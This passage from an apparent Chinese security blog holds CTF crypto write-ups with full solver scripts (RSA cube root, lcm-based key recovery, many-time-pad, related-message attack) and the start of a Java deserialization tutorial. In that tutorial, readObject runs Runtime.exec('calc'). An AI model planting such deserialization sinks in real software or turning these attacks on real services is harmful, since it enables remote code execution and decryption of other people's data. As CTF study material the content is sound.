<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import math</span><br><span class="line">import sys</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">arsa=RSA.generate(1024)</span><br><span class="line">arsa.p=</span><br><span class="line">arsa.q=</span><br><span class="line">arsa.e=</span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p-1)*(arsa.q-1))</span><br><span class="line">i=1</span><br><span class="line">while(True):</span><br><span class="line">    x=(Fn*i)+1</span><br><span class="line">    if(x%arsa.e==0):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           break</span><br><span class="line">    i=i+1</span><br><span class="line">private=open(&#x27;private.pem&#x27;,&#x27;w&#x27;)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure>

<p>生成私钥</p>
<p>在kali终端输入openssl进入openssl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsautl -decrypt -in flag.enc(密文名称) -inkey private.pem(我们所求得密钥名称)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p * q</span><br><span class="line">e = 65537</span><br><span class="line">leak = p &gt;&gt; 230</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(n)</span><br><span class="line">print(leak)</span><br><span class="line">print(c)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span><br><span class="line">6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span><br><span class="line">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>rsa2</title>
    <url>/2023/09/06/rsa2/</url>
    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/15/8ac13aee0e90f547.png"></p>
<span id="more"></span>

<h2 id="NSSCTF-2nd-EzRSA"><a href="#NSSCTF-2nd-EzRSA" class="headerlink" title="[NSSCTF 2nd]EzRSA"></a>[NSSCTF 2nd]EzRSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length()&lt;<span class="number">200</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">kbits = <span class="number">103</span></span><br><span class="line">m = (m &gt;&gt; kbits) &lt;&lt; kbits</span><br><span class="line">Mod = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">hint1 = (<span class="number">2021</span>-<span class="number">2023</span>*m) % Mod</span><br><span class="line">hint2 = <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">2023</span>, Mod)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint1 =&#x27;</span>,hint1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint2 =&#x27;</span>,hint2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span></span><br><span class="line"><span class="string">c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span></span><br><span class="line"><span class="string">hint1 = 153580531261794088318480897414037573794615852052189508424770502825730438732573547598712417272036492121110446656514226232815820756435437665617271385368704576530324067841094570337328191161458300549179813432377043779779861066187597784486306748688798924645894867137996446960685210314180286437706545416961668988800</span></span><br><span class="line"><span class="string">hint2 = 130939024886341321687705945538053996302793777331032277314813607352533647251650781154105954418698306293933779129141987945896277615656019480762879716136830059777341204876905094451068416223212748354774066124134473710638395595420261557771680485834288346221266495706392714094862310009374032975169649227238004805982</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>assert（断言）用于判断一个表达式，在表达式条件为 false 的时候触发异常。</p>
<p>断言可以在条件不满足程序运行的情况下直接返回错误，而不必等待程序运行后出现崩溃的情况，例如我们的代码只能在 Linux 系统下运行，可以先判断当前系统是否符合条件。</p>
<p>所以m的长度小于200 m的三次方的长度小于1024所以直接c 的值开三次方根即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span></span><br><span class="line">c = <span class="number">5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span></span><br><span class="line">m = iroot(c,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="CISCN-2022-西南-rsa"><a href="#CISCN-2022-西南-rsa" class="headerlink" title="[CISCN 2022 西南]rsa"></a>[CISCN 2022 西南]rsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">b&#x27;XXXXXXXX&#x27;</span></span><br><span class="line">p1 = getPrime(<span class="number">700</span>)</span><br><span class="line">r1 = getPrime(<span class="number">700</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    q1 = <span class="number">5</span>*p1+i</span><br><span class="line">n = p1*q1*r1</span><br><span class="line">p3 = <span class="built_in">pow</span>(p1,<span class="number">3</span>,n)</span><br><span class="line">q3 = <span class="built_in">pow</span>(q1,<span class="number">3</span>,n)</span><br><span class="line"><span class="built_in">print</span>(p3)</span><br><span class="line"><span class="built_in">print</span>(q3) //p3 q3 没有参与运算</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p3 = 29914513810588158800677413177910972738704129106546850855032986405861482276089830788972187432277517348644647399654780884571794069905291936470934226328931651386658328163535027343107140438177837479649822914209171476632450951930287641742344330471734177295804718555774395704231261550376220154493373703096062950390869299905383682611063374747752091585836452902373843865043412096365874638466683035848817858586173172058756256354758712684819253211761289032789542371351760915771791997388241121078055468403109260493642435791152671979552597191217179672328555740595434990908530985477314228867209314472001848844089467987561661918366232980944933533</span></span><br><span class="line"><span class="string">q3 = 66208618374366130551979192465001581263127328176551695213970812805980115496523825511250542987452691413485117902772315362811067501379171731387904074565035353566976164797769439898266222919741874340315356585585077141595328441423323822407738375537476582506440045835592730211502035261968878999959340204806442390319739977816872969200022096331677277225467021553564212725120939434924481787524609852608476848761521446441776154400518315701988027274150425936061679275540502720782853648148897480117033152064922234451671636288396704170234613549011854618414776342798740690128675106027908639984431432591397555541420243824539205614036979987830125678</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">P = getPrime(<span class="number">1024</span>)</span><br><span class="line">Q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = P * Q</span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">lcm = gmpy2.lcm(P-<span class="number">1</span>, Q-<span class="number">1</span>)  //求最小公倍数</span><br><span class="line">e1 = gmpy2.invert(p1, lcm)</span><br><span class="line">e2 = gmpy2.invert(r1, lcm)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, E, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(lcm)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lcm = 4292158730589770192682795435047249488185453170529228019750042608688907718268448193363838203887391025871515871000364259326343790645215256385842265899206372365402431198699714374850409466996627163968391249416054093529090485677808301343590811445080871279796162536469847469761747058736980603093722710824453312207182881241846080117790728778291633761198069016865260030288832065807438020772711645648333908622890343009942617559434851450007195025869850769670769715654662127278293639938359741401336592219730356884542179574372134014927006215640945952229142436595334916765255426954857520777553915330597952622785359222832224632624</span></span><br><span class="line"><span class="string">c = 4288727484183191191687364666620023549392656794153112764357730676861570386983002380982803054964588111708662498647767438881892355599604826306427809017097724346976778230464708540600157055782723189971534549543664668430013171469625043063261219462210251726207552819381767396148632877168530609902046293626355744288863460554297860696918890189350721960355460410677203131993419723440382095665713164422367291153108363066159712951217816814873413423853338021627653555202253351957999686659021298525147460016557904084617528199284448056532965033560516083489693334373695545423561715471204868795248569806148395196572046378679014697206</span></span><br><span class="line"><span class="string">N  = 17168634922359080770731181740188997952741812682116912079000170434755630873073792773455352815549564103486063484001457037305375162580861025543369063596825489461609724794798857499401637867986508655873564997664216374116361942711233205374363245780323485119184650145879389879046988234947922412374890843297813248828996855478005656041814919367820336728271583686844991928889831691815821365423570311291064846736832327637944358854661523107817781673029406341843040857813841671405147146887291204140157388049394514390098066284975682117038362207142272098796924412602725857521665773622056312191400612944442008222587867782281556388669</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>直接用lcm和E求d就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p3 = <span class="number">29914513810588158800677413177910972738704129106546850855032986405861482276089830788972187432277517348644647399654780884571794069905291936470934226328931651386658328163535027343107140438177837479649822914209171476632450951930287641742344330471734177295804718555774395704231261550376220154493373703096062950390869299905383682611063374747752091585836452902373843865043412096365874638466683035848817858586173172058756256354758712684819253211761289032789542371351760915771791997388241121078055468403109260493642435791152671979552597191217179672328555740595434990908530985477314228867209314472001848844089467987561661918366232980944933533</span></span><br><span class="line">q3 = <span class="number">66208618374366130551979192465001581263127328176551695213970812805980115496523825511250542987452691413485117902772315362811067501379171731387904074565035353566976164797769439898266222919741874340315356585585077141595328441423323822407738375537476582506440045835592730211502035261968878999959340204806442390319739977816872969200022096331677277225467021553564212725120939434924481787524609852608476848761521446441776154400518315701988027274150425936061679275540502720782853648148897480117033152064922234451671636288396704170234613549011854618414776342798740690128675106027908639984431432591397555541420243824539205614036979987830125678</span></span><br><span class="line">lcm = <span class="number">4292158730589770192682795435047249488185453170529228019750042608688907718268448193363838203887391025871515871000364259326343790645215256385842265899206372365402431198699714374850409466996627163968391249416054093529090485677808301343590811445080871279796162536469847469761747058736980603093722710824453312207182881241846080117790728778291633761198069016865260030288832065807438020772711645648333908622890343009942617559434851450007195025869850769670769715654662127278293639938359741401336592219730356884542179574372134014927006215640945952229142436595334916765255426954857520777553915330597952622785359222832224632624</span></span><br><span class="line">c = <span class="number">4288727484183191191687364666620023549392656794153112764357730676861570386983002380982803054964588111708662498647767438881892355599604826306427809017097724346976778230464708540600157055782723189971534549543664668430013171469625043063261219462210251726207552819381767396148632877168530609902046293626355744288863460554297860696918890189350721960355460410677203131993419723440382095665713164422367291153108363066159712951217816814873413423853338021627653555202253351957999686659021298525147460016557904084617528199284448056532965033560516083489693334373695545423561715471204868795248569806148395196572046378679014697206</span></span><br><span class="line">N  = <span class="number">17168634922359080770731181740188997952741812682116912079000170434755630873073792773455352815549564103486063484001457037305375162580861025543369063596825489461609724794798857499401637867986508655873564997664216374116361942711233205374363245780323485119184650145879389879046988234947922412374890843297813248828996855478005656041814919367820336728271583686844991928889831691815821365423570311291064846736832327637944358854661523107817781673029406341843040857813841671405147146887291204140157388049394514390098066284975682117038362207142272098796924412602725857521665773622056312191400612944442008222587867782281556388669</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,lcm)</span><br><span class="line">m=gmpy2.powmod(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>sictf2023</title>
    <url>/2023/09/23/sictf-cy/</url>
    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/23/8d52ea0129fb1993.png"></p>
<span id="more"></span>

<p>附件地址</p>
<p>[ctf&#x2F;Sictf2023 #Round 2&#x2F;crypto at main · nyyyddddn&#x2F;ctf (github.com)](<a href="https://github.com/nyyyddddn/ctf/tree/main/Sictf2023">https://github.com/nyyyddddn/ctf/tree/main/Sictf2023</a> %23Round 2&#x2F;crypto)</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, message</span><br><span class="line"><span class="comment"># message is a Classic English Story</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    tmp = (message[i*<span class="number">30</span>:(i+<span class="number">1</span>)*<span class="number">30</span>].encode())</span><br><span class="line">    <span class="built_in">print</span>(binascii.hexlify(strxor(tmp,flag)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218</span></span><br><span class="line"><span class="comment"># 3769373b66142f31297f291126410e042b01162d59103a0c005221075013</span></span><br><span class="line"><span class="comment"># 37242c202e1e3f743c36371130410c1e2b491a31574406014505291a550e</span></span><br><span class="line"><span class="comment"># 7f6922742e1a213270372e01264105193004532b1f554e120c1e2a145618</span></span><br><span class="line"><span class="comment"># 7d69143c23156d18392b35183141310e3b49213613590003453a291a555d</span></span><br><span class="line"><span class="comment"># 36273731341e297424372454230e0c0f2c49127f005f020245112718545d</span></span><br><span class="line"><span class="comment"># 26396320295b2531227161273c04430f360d533118444e0f0b1d31554615</span></span><br><span class="line"><span class="comment"># 323d6335660c24373b3a2554350f0a063e05533712101905165e66145f19</span></span><br><span class="line"><span class="comment"># 733e222766152220703e27063508074b300f53371e5d40444735291a555d</span></span><br><span class="line"><span class="comment"># 37283a7432146d2d3f2a6d541808171f330c530d12544e360c162f1b565d</span></span><br></pre></td></tr></table></figure>

<p><strong>Many-Time-Pad 攻击</strong></p>
<p><a href="https://www.ruanx.net/many-time-pad/">Many-Time-Pad 攻击 (ruanx.net)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import Crypto.Util.strxor as xo</span><br><span class="line">import libnum, codecs, numpy as np</span><br><span class="line"></span><br><span class="line">def isChr(x):</span><br><span class="line">    if ord(&#x27;a&#x27;) &lt;= x and x &lt;= ord(&#x27;z&#x27;): return True</span><br><span class="line">    if ord(&#x27;A&#x27;) &lt;= x and x &lt;= ord(&#x27;Z&#x27;): return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def infer(index, pos):</span><br><span class="line">    if msg[index, pos] != 0:</span><br><span class="line">        return</span><br><span class="line">    msg[index, pos] = ord(&#x27; &#x27;)</span><br><span class="line">    for x in range(len(c)):</span><br><span class="line">        if x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def know(index, pos, ch):</span><br><span class="line">    msg[index, pos] = ord(ch)</span><br><span class="line">    for x in range(len(c)):</span><br><span class="line">        if x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line">def getSpace():</span><br><span class="line">    for index, x in enumerate(c):</span><br><span class="line">        res = [xo.strxor(x, y) for y in c if x!=y]</span><br><span class="line">        f = lambda pos: len(list(filter(isChr, [s[pos] for s in res])))</span><br><span class="line">        cnt = [f(pos) for pos in range(len(x))]</span><br><span class="line">        for pos in range(len(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), &#x27;hex&#x27;) for x in open(&#x27;Problem.txt&#x27;, &#x27;r&#x27;).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([len(c), len(c[0])], dtype=int)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = sorted(dat)[::-1]</span><br><span class="line">for w, index, pos in dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(1, 28, &#x27;a&#x27;)</span><br><span class="line">know(1, 24, &#x27;e&#x27;)</span><br><span class="line">know(1, 16, &#x27;t&#x27;)</span><br><span class="line">know(0, 10, &#x27; &#x27;)</span><br><span class="line">know(0, 12, &#x27;i&#x27;)</span><br><span class="line"></span><br><span class="line">print(&#x27;\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))</span><br><span class="line"></span><br><span class="line">key = xo.strxor(c[0], &#x27;&#x27;.join([chr(c) for c in msg[0]]).encode())</span><br><span class="line">print(key)</span><br><span class="line"></span><br><span class="line"># Little Red Riding Hood promise</span><br><span class="line"># d to obey her mother. The gran</span><br><span class="line"># dmother lived out in the woods</span><br><span class="line"># , a half hour from the village</span><br><span class="line"># . When Little Red Riding Hood </span><br><span class="line"># entered the woods a wolf came </span><br><span class="line"># up to her. She did not know wh</span><br><span class="line"># at a wicked animal he was, and</span><br><span class="line">#  was not afraid of him. &quot;Good </span><br><span class="line"># day to you, Little Red Riding </span><br><span class="line"># b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from secret import flag</span><br><span class="line">from  Crypto.Util.number import *</span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line">e = getPrime(10)</span><br><span class="line">n = p*q</span><br><span class="line">c1 = pow(114*m+2333,e,n)</span><br><span class="line">c2 = pow(514*m+4555,e,n)</span><br><span class="line">print(f&#x27;n = &#123;n&#125;&#x27;)</span><br><span class="line">print(f&#x27;c1 = &#123;c1&#125;&#x27;)</span><br><span class="line">print(f&#x27;c2 = &#123;c2&#125;&#x27;)</span><br><span class="line">n = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883</span><br><span class="line">c1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520</span><br><span class="line">c2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">def short_pad_attack(c1, c2, e, n):</span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"> </span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"> </span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"> </span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"> </span><br><span class="line">    kbits = n.nbits()//(2*e*e)</span><br><span class="line">    diff = h.small_roots(X=2^kbits, beta=0.5)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.5</span><br><span class="line"> </span><br><span class="line">    return diff</span><br><span class="line"> </span><br><span class="line">def related_message_attack(c1, c2, diff, e, n):</span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"> </span><br><span class="line">    def gcd(g1, g2):</span><br><span class="line">        while g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        return g1.monic()</span><br><span class="line"> </span><br><span class="line">    return -gcd(g1, g2)[0]</span><br><span class="line"> </span><br><span class="line">from Crypto.Util.number import long_to_bytes as l2b,isPrime </span><br><span class="line"> </span><br><span class="line">for e in range(1&lt;&lt;9,1&lt;&lt;10):</span><br><span class="line">    if not isPrime(e): continue</span><br><span class="line">    print(e)</span><br><span class="line">    c1_ = c1 * pow(514, e, n) % n </span><br><span class="line">    c2_ = c2 * pow(114, e, n) % n </span><br><span class="line">    diff = 2333*514 - 4555*114</span><br><span class="line">    try:</span><br><span class="line">        m0 = related_message_attack(c1_, c2_, -diff, e, n)</span><br><span class="line">        m = (m0//514 - 2333)//114</span><br><span class="line">        v = l2b(int(m))</span><br><span class="line">        print(v)</span><br><span class="line">        if b&#x27;SICTF&#x27; in v:</span><br><span class="line">            print(e, m0)</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>java反序列化基础</title>
    <url>/2023/10/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>  认真写</p>
<span id="more"></span>

<p>java 命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serialization</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h2><p>JDK类库中序列化API</p>
<p>问什么会产生安全问题</p>
<p><strong>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击这在服务器上运行代码的能力。</strong></p>
<p>可能的形式</p>
<ol>
<li>入口类的readObject直接调用危险方法</li>
<li>入口类参数中包含可控类，该类有危险方法，readObject时调用。</li>
<li>入口类参数中包含可控类，该类又调用其他，有危险方法的类，readObject时调用</li>
</ol>
<p>比如类型定义为Object 调用equals&#x2F;hashcode&#x2F;toString</p>
<p>重点 相同类型 ，同名函数</p>
<p>4.构造函数&#x2F;静态代码块等类加载时隐式执行.</p>
<p>共同条件，继承Serializable</p>
<p>入口类source （重写readObject 调用常见的函数，参数类型宽泛，最好jdk自带）</p>
<p>调用链 gadget chain</p>
<p>执行类 sink (rce ssrf写文件等等)</p>
<p><strong>java.io.ObjectOutputStream：表示对象输出流</strong></p>
<p>它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
<p><strong>java.io.ObjectInputStream：表示对象输入流</strong></p>
<p>它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回</p>
<p> 5.transient 标识的对象成员变量不参与序列化</p>
<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>  <span class="comment">//implements Serializable 序列化的接口</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span> <span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name =name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span>+name+<span class="string">&#x27;\&#x27;&#x27;</span>+</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span>+age+</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois )</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Serialize.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">serializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span>  <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span 